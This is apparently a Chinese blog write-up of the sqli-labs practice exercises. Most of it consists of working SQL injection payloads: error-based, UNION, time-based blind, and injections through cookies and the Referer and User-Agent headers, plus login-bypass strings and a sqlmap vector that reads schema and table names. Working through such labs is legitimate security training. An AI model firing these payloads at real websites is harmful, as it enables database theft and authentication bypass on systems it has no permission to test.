<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592570103001-f13eaf77-f49e-4e86-932a-11b3e275ab7c.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=too_long.png&originHeight=239&originWidth=1116&size=9796&status=done&style=none&width=1116" alt="too_long.png"><br>发现它提示用户名太长了，搜索一番之后解决方案不易实现（都需要改 php.ini 并重启），写了以下二次注入脚本</p>
<p>ref:</p>
<ul>
<li><a href="https://blog.csdn.net/zhaopeipei1985/article/details/2633997" target="_blank" rel="noopener"> 成功解决 data too long for column ‘name’ at row 1</a></li>
</ul>
<h1 id="Less-23-Error-Based-no-comments"><a href="#Less-23-Error-Based-no-comments" class="headerlink" title="Less-23 Error Based- no comments"></a>Less-23 <strong>Error Based- no comments</strong></h1><p>把注释替换掉了，那么就要想其它办法闭合。这里采用运算符<code>&gt;</code>来连接 payload，实际上<code>- * | %</code>都可以作为双目运算符连接. 单目运算符的话，可以用<code>! ^</code>等</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1' and ''&gt;(extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ) or '</span><br><span class="line">//无论单双目运算符，只要闭合语句即可</span><br><span class="line">id=1' and ~(extractvalue(0x20,concat(0x7c7c,version(),0x7c7c)) ) or '</span><br></pre></td></tr></table></figure>

<h1 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string"></a>Less-22 Cookie Injection- Error Based- Double Quotes - string</h1><p>cookie 注入，双引号，直接用 burp 的 Pitchfork 模式来 fuzzing，第一个位置是 base64 编码的 payload，第二个是占位用的原始 payload，可以看到双引号<code>&quot;</code>有报错<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592458022007-a5ad99a4-0790-4adc-85ec-c1c2593a24c3.png#align=left&display=inline&height=477&margin=%5Bobject%20Object%5D&name=image.png&originHeight=953&originWidth=1915&size=223120&status=done&style=none&width=957.5" alt="image.png"></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin"and extractvalue(0x20,concat(0x7c7c,version(),0x7c7c))-- -</span><br><span class="line"></span><br><span class="line"><span class="section"># 同样的，base64 编码</span></span><br><span class="line"></span><br><span class="line">YWRtaW4iYW5kIGV4dHJhY3R2YWx1ZSgweDIwLGNvbmNhdCgweDdjN2MsdmVyc2lvbigpLDB4N2M3YykpLS0gLQ==</span><br></pre></td></tr></table></figure>

<h1 id="Less-21-Cookie-Injection-Error-Based-complex-string"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string"></a>Less-21 Cookie Injection- Error Based- complex - string</h1><p>cookie 注入，只不过需要先 base64 编码</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	payload如下</span><br><span class="line">admin'and extractvalue(0x20, concat(0x7c,version(),0x7c)) and '</span><br><span class="line">	base64编码如下</span><br><span class="line"><span class="attribute">YWRtaW4nYW5kIGV4dHJhY3R2YWx1ZSgweDIwLCBjb25jYXQoMHg3Yyx2ZXJzaW9uKCksMHg3YykpIGFuZCAn</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592408875594-64d93452-df5f-4f9f-b37b-3e708cd63b35.png#align=left&display=inline&height=249&margin=%5Bobject%20Object%5D&name=image.png&originHeight=498&originWidth=1917&size=104138&status=done&style=none&width=958.5" alt="image.png"></p>
<h1 id="Less-20-Cookie-Injection-Error-Based-string"><a href="#Less-20-Cookie-Injection-Error-Based-string" class="headerlink" title="Less-20 Cookie Injection- Error Based- string"></a>Less-20 Cookie Injection- Error Based- string</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592407109925-acfdbfdf-16bb-49a5-92d7-29a0d16cc7aa.png#align=left&display=inline&height=419&margin=%5Bobject%20Object%5D&name=image.png&originHeight=837&originWidth=1919&size=442631&status=done&style=none&width=959.5" alt="image.png"><br>cookie 注入，在登录之后，更改 cookie，加单引号发现报错，猜测原始语句，构造如下 payload 即可</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: uname=admin'and extractvalue(0x20,concat(0x7c,version())) -- -</span><br></pre></td></tr></table></figure>

<h1 id="Less-19-Header-Injection-Referer-Error-Based-string"><a href="#Less-19-Header-Injection-Referer-Error-Based-string" class="headerlink" title="Less-19 Header Injection- Referer- Error Based- string"></a>Less-19 Header Injection- Referer- Error Based- string</h1><p>到这里才摸到一点门道，一样的报错注入，<code>&#39;and [payload] and&#39;</code>的形式，用<code>0x7c</code>（也就是<code>|</code>）把查询内容<code>version()</code>字符串化，报错输出</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 123321'and extractvalue(0x20, concat(0x7c,version(),0x7c)) and '</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: '|5.7.30-0ubuntu0.18.04.1|'</span><br></pre></td></tr></table></figure>

<h1 id="Less-18-Header-Injection-Error-Based-string"><a href="#Less-18-Header-Injection-Error-Based-string" class="headerlink" title="Less-18 Header Injection- Error Based- string"></a>Less-18 Header Injection- Error Based- string</h1><p>通过阅读源码，知道了语句结构</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";</span><br></pre></td></tr></table></figure>

<p>但为啥这样闭合我是真没想明白。。。。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span>: 'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span><br></pre></td></tr></table></figure>

<p>【后续】想明白了，最终的语句即<code>&#39;``&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;``&#39;</code> ，中间就是我们拼接的 payload，实际上是参与<strong>与运算</strong>得到的一个值，这<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592377145499-e2f1f2da-8777-41f8-897d-06e0549e5c46.png#align=left&display=inline&height=270&margin=%5Bobject%20Object%5D&name=image.png&originHeight=539&originWidth=1206&size=73778&status=done&style=none&width=603" alt="image.png"><br>最后用如下语句完成了报错注入,</p>
<ul>
<li><code>7c</code> -&gt; <code>|</code></li>
<li><code>3a</code> -&gt; <code>:</code></li>
</ul>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span><br></pre></td></tr></table></figure>

<h1 id="Less-17-Update-Query-Error-based-String"><a href="#Less-17-Update-Query-Error-based-String" class="headerlink" title="Less-17 Update Query- Error based - String"></a>Less-17 Update Query- Error based - String</h1><p>测试当用户名是<code>admin</code>时，密码框有报错注入<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1592143252481-0148265c-d490-4009-bf3d-6310ac4de355.png#align=left&display=inline&height=452&margin=%5Bobject%20Object%5D&name=image.png&originHeight=903&originWidth=1462&size=462720&status=done&style=none&width=731" alt="image.png"></p>
<h1 id="Less-16-Blind-Time-Based-Double-quotes-String"><a href="#Less-16-Blind-Time-Based-Double-quotes-String" class="headerlink" title="Less-16- Blind- Time Based- Double quotes- String"></a>Less-16- Blind- Time Based- Double quotes- String</h1><p>确定闭合符号，<br>子查询确定注入符号</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">")or (select 1 from (select sleep(2) )x)-- -1</span></span><br></pre></td></tr></table></figure>

<p>延时 2 秒</p>
<h1 id="Less-15-Blind-Boolian-Based-String"><a href="#Less-15-Blind-Boolian-Based-String" class="headerlink" title="Less-15- Blind- Boolian Based- String"></a>Less-15- Blind- Boolian Based- String</h1><p>加单双引号都不报错了，知道用户名是<code>admin</code>的情况下，只能通过是否成功登录来确定闭合符号<br>闭合符号是单引号</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin' <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<p>是延时盲注。</p>
<h1 id="Less-14-Double-Injection-Double-quotes-String"><a href="#Less-14-Double-Injection-Double-quotes-String" class="headerlink" title="Less-14- Double Injection- Double quotes- String"></a>Less-14- Double Injection- Double quotes- String</h1><p>加双引号报错了，接着确定出闭合符号就是双引号<code>&quot;</code>，下一步直接进行注入即可<br>没有回显的情况下，即使使用<code>order by</code>确定了有两列数据 ，但用<code>UNION</code>就只有走布尔盲注那条路，并且基于<code>floor</code>的报错注入要求表中至少要有三项以上的数据，显然是行不通的。<br>把前面的<code>payload</code>里的闭合符号改改，快速通过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin" and extractvalue(1, concat(0x5c,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">1</span>),<span class="string">'~'</span>));<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-13-Double-Injection-String-with-twist"><a href="#Less-13-Double-Injection-String-with-twist" class="headerlink" title="Less-13- Double Injection- String- with twist"></a>Less-13- Double Injection- String- with twist</h1><p>加单引号报错，闭合符号是<code>&#39;)</code>，用<code>admin&#39;)-- -</code>，没想到是万能密码直接成功登录了<br>同样的用<code>sqlmap</code>冲，即可。但是我还是选择手工搞报错注入，一定要把末尾闭合，才能得到报错注入出来的信息！</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆版本号</span></span><br><span class="line">admin') and extractvalue(1,concat("~",version(),"~"))<span class="comment">-- -</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h1 id="Less-12-Error-Based-Double-quotes-String"><a href="#Less-12-Error-Based-Double-quotes-String" class="headerlink" title="Less-12- Error Based- Double quotes- String"></a>Less-12- Error Based- Double quotes- String</h1><p>确定闭合符号的时候遇到点问题，一开始用<code>admin&quot;</code>的时候报错，但是万能密码却尝试失败<code>admin&quot;or&quot;&quot;=&quot;</code>, 后来使用注释来确定闭合符号<code>admin&quot;-- -</code>、<code>admin&quot;)-- -</code>成功闭合</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 万能密码</span></span><br><span class="line">admin")or""=("</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释绕过</span></span><br><span class="line">因为最后有个 LIMIT 1，1  就不太能用username=<span class="comment">/*&amp;password=*/</span>的方式来绕过密码</span><br></pre></td></tr></table></figure>

<p>直接跑<code>sqlmap -r</code> 即可</p>
<h1 id="Less-11-Error-Based-String"><a href="#Less-11-Error-Based-String" class="headerlink" title="Less-11- Error Based- String"></a>Less-11- Error Based- String</h1><h2 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h2><p>加引号，报错。确定用单引号闭合<code>admin&#39; -- -</code>, 报错注入+<code>UNION</code>联合注入</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 万能密码</span></span><br><span class="line"></span><br><span class="line">admin' or ''='</span><br><span class="line">admin' and extractvalue(1,concat("~",(version()),"~"))-- -</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Less-10：Blind-Time-based-Double-Quotes-String"><a href="#Less-10：Blind-Time-based-Double-Quotes-String" class="headerlink" title="Less-10：Blind- Time based- Double Quotes- String"></a>Less-10：Blind- Time based- Double Quotes- String</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1" and sleep(2)='1' <span class="comment">-- -		有延时</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-9：Blind-Time-based-Single-Quotes-String"><a href="#Less-9：Blind-Time-based-Single-Quotes-String" class="headerlink" title="Less-9：Blind- Time based- Single Quotes- String"></a>Less-9：Blind- Time based- Single Quotes- String</h1><p>无论是添加引号还是注释，都完全不报错。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=2' AND '1'=SLEEP(1)<span class="comment">-- -		有延时</span></span><br><span class="line">id=2' AND '1'=SLEEP(5)<span class="comment">-- -		有延时</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-8：Blind-Boolian-Single-Quotes-String"><a href="#Less-8：Blind-Boolian-Single-Quotes-String" class="headerlink" title="Less-8：Blind- Boolian- Single Quotes- String"></a>Less-8：Blind- Boolian- Single Quotes- String</h1><p>有状态回显，闭合符号是单引号<code>&#39;</code> ，<br>根据是否回显<code>You are in...........</code>来判断.<br>得出结论，盲注可分为两类：布尔盲注+基于时间的盲注。<br>因为没有 t/f 的回显，即从响应上看不出任何差异（响应包括：响应大小/状态码/页内文字）</p>
<h1 id="Less-7：Dump-into-Outfile"><a href="#Less-7：Dump-into-Outfile" class="headerlink" title="Less-7：Dump into Outfile"></a>Less-7：Dump into Outfile</h1><p>无数据和错误回显，依然是先确定闭合。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1' <span class="comment">-- -		报错</span></span><br><span class="line">id=1') <span class="comment">-- -		报错</span></span><br><span class="line">id=1')) <span class="comment">-- -		正常</span></span><br></pre></td></tr></table></figure>

<p>布尔盲注+延时注入，sqlmap 一把梭了</p>
<h1 id="Less-6：Double-Query-Double-Quotes-String"><a href="#Less-6：Double-Query-Double-Quotes-String" class="headerlink" title="Less-6：Double Query- Double Quotes- String"></a>Less-6：Double Query- Double Quotes- String</h1><p>闭合变成单引号，其余于 Less 5 一样</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=1" and updatexml("1",concat("~",version(),"~"),"1")<span class="comment">-- -</span></span><br><span class="line"><span class="comment"># 单行</span></span><br><span class="line">id=1" and updatexml("1",concat("~",(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="number">0x20</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>))),<span class="string">"~"</span>),<span class="string">"1"</span>)<span class="comment">-- -</span></span><br><span class="line"><span class="comment"># 多行</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="string">" and updatexml("</span><span class="number">1</span><span class="string">",concat("</span>~<span class="string">",((select group_concat(column_name) from information_schema.columns where table_name='emails')),"</span>~<span class="string">"),"</span><span class="number">1</span><span class="string">")-- -</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-5：Double-Query-Single-Quotes-String"><a href="#Less-5：Double-Query-Single-Quotes-String" class="headerlink" title="Less-5：Double Query- Single Quotes- String"></a>Less-5：Double Query- Single Quotes- String</h1><p>无数据回显的注入点</p>
<h2 id="闭合-1"><a href="#闭合-1" class="headerlink" title="闭合"></a>闭合</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1"		正常</span><br><span class="line">id=1'		报错</span><br><span class="line">id=1'<span class="comment">-- -		正常</span></span><br></pre></td></tr></table></figure>

<p>闭合字符串是单引号<code>&#39;</code>，猜测后端语句是<code>select id from test where id=&#39;$id&#39;;</code><br>因为没有回显位，无法使用联合注入，但可用 union 引入 floor 的报错注入</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">id=1' AND EXTRACTVALUE(1,concat("~",(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span>),<span class="string">"~"</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="string">' AND EXTRACTVALUE(1,concat("~",(select group_concat(column_name) from information_schema.columns where table_name='</span>emails<span class="string">'),"~"))-- -</span></span><br><span class="line"><span class="string">id=1'</span> <span class="keyword">AND</span> EXTRACTVALUE(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">"~"</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="string">"~"</span>))<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># floor</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="string">' UNION SELECT null,null,null from (SELECT COUNT(*),concat(floor(rand(0)*2),"~",version())x from information_schema.tables group by x )x-- -</span></span><br><span class="line"><span class="string">id=1'</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span> <span class="keyword">from</span> (<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="string">"~"</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="number">0x20</span>,table_name) <span class="keyword">from</span> information_schema.tables ))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )x<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-4：Error-Based-DoubleQuotes-String"><a href="#Less-4：Error-Based-DoubleQuotes-String" class="headerlink" title="Less-4：Error Based- DoubleQuotes String"></a>Less-4：Error Based- DoubleQuotes String</h1><h2 id="闭合-2"><a href="#闭合-2" class="headerlink" title="闭合"></a>闭合</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1'	   正常</span><br><span class="line">id=1"	   报错</span><br><span class="line">id=1" <span class="comment">-- -		报错</span></span><br><span class="line">id=1") <span class="comment">-- -   正常</span></span><br></pre></td></tr></table></figure>

<p>闭合字符串是<code>&quot;)</code>合理猜测原语句结构为<code>select id from test where id=(&quot;$id&quot;);</code></p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 联合</span></span><br><span class="line">id=-2") union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(schema_name,<span class="number">0x20</span>) <span class="keyword">from</span> information_schema.schemata <span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 报错</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">")+AND+updatexml(1,concat("</span>~<span class="string">",(select+version()),'~'),1)-- -</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586505197604-40c983d2-34cc-4005-a2ec-9d61d6653b24.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&name=image.png&originHeight=274&originWidth=1903&size=50340&status=done&style=none&width=951.5" alt="image.png"></p>
<h1 id="less-3：Error-Based-String-with-Twist"><a href="#less-3：Error-Based-String-with-Twist" class="headerlink" title="less-3：Error Based- String (with Twist)"></a>less-3：Error Based- String (with Twist)</h1><h2 id="确定闭合符号啊！"><a href="#确定闭合符号啊！" class="headerlink" title="确定闭合符号啊！"></a>确定闭合符号啊！</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1'		报错</span><br><span class="line">id=1' <span class="comment">-- -  报错</span></span><br><span class="line">id=1') <span class="comment">-- -  正常</span></span><br></pre></td></tr></table></figure>

<p>确定闭合符号是<code>&#39;)</code>，就可以按照之前的步骤来注入了</p>
<h2 id="联合注"><a href="#联合注" class="headerlink" title="联合注"></a>联合注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">id=-2') union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(schema_name,<span class="number">0x20</span>) <span class="keyword">from</span> information_schema.schemata <span class="comment">-- -</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-2</span><span class="string">') union select 1,2,group_concat(table_name,0x20) from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">' -- -</span></span><br><span class="line"><span class="string">id=-2'</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name,<span class="number">0x20</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<h2 id="报错注"><a href="#报错注" class="headerlink" title="报错注"></a>报错注</h2><p><strong>有回显长度的限制</strong><br>如果不用 concat 把它字符串化，会导致结果回显失败</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id=-1')+AND+updatexml(1,concat("~",(<span class="keyword">select</span>+<span class="keyword">version</span>()),<span class="string">'~'</span>),<span class="number">1</span>)<span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">')+AND+extractvalue(1,concat("~",(select+version()),'</span>~<span class="string">'))-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=-1'</span>) <span class="keyword">and</span> extractvalue(<span class="number">1</span>, (<span class="keyword">SELECT</span>+<span class="keyword">group_concat</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">0x20</span>)+<span class="keyword">FROM</span>+information_schema.columns))<span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="string">') union select 1,2,3 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x )a-- -</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586502458478-76f20c40-ccc1-4ded-8e1d-f6ea67f5fded.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=1710&size=31954&status=done&style=none&width=855" alt="image.png"><br><strong>floor 无回显限制</strong><br>从<code>sqlmap</code>提取出来的攻击向量<code>Vector</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,0x7365637572697479,0x73797 '||(<span class="keyword">SELECT</span> <span class="number">0x45576d74</span> <span class="keyword">WHERE</span> <span class="number">1206</span>=<span class="number">1206</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">5316</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x71707a7871</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(table_schema <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">54</span>) <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> table_schema <span class="keyword">IN</span> (<span class="number">0x696e666f726d6174696f6e5f736368656d61</span>,<span class="number">0x6d7973716c</span>,<span class="number">0x6d7973716c69</span>,<span class="number">0x706572666f726d616e63655f736368656d61</span>,<span class="number">0x7365637572697479</span>,<span class="number">0x737973</span>) <span class="keyword">LIMIT</span> <span class="number">39</span>,<span class="number">1</span>),<span class="number">0x7171627171</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a))||<span class="string">'3) LIMIT 39,1),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1') union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a<span class="comment">-- -</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586499264221-8c1cfe72-41ce-4d39-80ef-9d0c35fb8024.png#align=left&display=inline&height=101&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=1803&size=38402&status=done&style=none&width=901.5" alt="image.png"></p>
<h1 id="less-2：Error-Based-Intiger"><a href="#less-2：Error-Based-Intiger" class="headerlink" title="less-2：Error Based- Intiger"></a>less-2：Error Based- Intiger</h1><h2 id="联合注-1"><a href="#联合注-1" class="headerlink" title="联合注"></a>联合注</h2><p><code>order by</code>定列数：3 列，回显 2，3 位置，直接用 group_concat 尝试取出所有数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0  UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>( column_name,<span class="number">0x20</span>) <span class="keyword">from</span> information_schema.columns</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1586420151258-f3369495-a134-49e3-b852-5c83003e7679.png#align=left&display=inline&height=391&margin=%5Bobject%20Object%5D&name=image.png&originHeight=781&originWidth=1907&size=114837&status=done&style=none&width=953.5" alt="image.png"></p>
<h2 id="报错注-1"><a href="#报错注-1" class="headerlink" title="报错注"></a>报错注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://sqli.zuoxueba.org/Less-2/?id=1 and</span><br><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>)))</span><br><span class="line"><span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x</span><br><span class="line"><span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>

<p>整型注入，不需要加单引号</p>
